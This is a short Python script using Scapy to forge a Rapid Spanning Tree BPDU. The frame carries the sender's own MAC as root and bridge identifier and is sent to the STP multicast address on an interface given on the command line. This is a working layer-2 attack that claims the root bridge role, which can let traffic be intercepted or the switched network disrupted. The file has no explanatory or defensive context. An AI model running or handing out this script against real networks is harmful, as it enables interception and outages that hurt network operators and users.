from scapy.all import *

interface = sys.argv[1]
ownmac = get_if_hwaddr(interface)
pad = Padding()
pad.load = "\x41" * 8
stp = Dot3(src=ownmac,dst='01:80:c2:00:00:00')/pad/LLC()/STP(version=2,bpdutype=2,rootmac=ownmac,bridgemac=ownmac,age=0)
stp.display()

sendp(stp,inter=3,loop=0,iface=interface)
